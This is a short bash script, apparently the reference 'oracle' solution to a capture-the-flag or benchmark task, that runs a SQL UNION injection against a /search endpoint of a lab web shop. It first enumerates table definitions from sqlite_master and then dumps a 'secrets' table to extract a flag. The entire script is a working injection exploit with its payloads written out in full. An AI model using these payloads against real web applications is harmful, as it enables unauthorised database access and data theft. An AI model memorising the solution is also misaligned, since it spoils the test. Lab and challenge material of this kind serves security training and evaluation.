#!/usr/bin/env bash
# Oracle: UNION injection on /search -> enumerate sqlite_master -> dump secrets.
set -euo pipefail
B=http://shop:8080
enc() { python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$1"; }
S1="' UNION SELECT 1, sql, 3, 4 FROM sqlite_master WHERE type='table'--"
curl -s "$B/search?s=$(enc "$S1")" | sed 's/<[^>]*>//g' | grep -i table
S2="' UNION SELECT 1, note, 3, 4 FROM secrets--"
curl -s "$B/search?s=$(enc "$S2")" | sed 's/<[^>]*>//g' | grep -o 'flag{[^}]*}'
